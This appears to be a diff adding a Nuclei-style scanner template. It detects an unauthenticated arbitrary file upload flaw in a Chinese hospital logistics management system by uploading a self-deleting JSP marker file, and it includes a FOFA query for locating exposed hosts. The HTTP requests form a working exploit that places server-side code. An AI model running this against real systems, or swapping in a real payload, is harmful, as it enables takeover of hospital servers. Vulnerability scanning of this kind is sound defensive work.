@@ -1,0 +1,50 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - ([0-9]+/\w+\.jsp)
+          type: regex
+      raw:
+        - |
+          POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+          ------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+          Content-Disposition: form-data; name="Filedata"; filename="{{username}}.jsp"
+          Content-Type: application/octet-stream
+
+          <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+          ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /apk/{{uploadfile}} HTTP/1.1
+          Host: {{Hostname}}
+id: hospital-processApkUpload_upload-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="frameworkModuleJob"
+        医院一站式后勤管理系统 processApkUpload.upload 接口处任意文件上传漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 医院一站式后勤管理系统 processApkUpload.upload 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/ZMa1dzVWODKULXIgDYt0rg
+    severity: high
+    tags:
+        - Oce
+        - Servlet
+variables:
+    username: '{{to_lower(rand_base(6))}}'
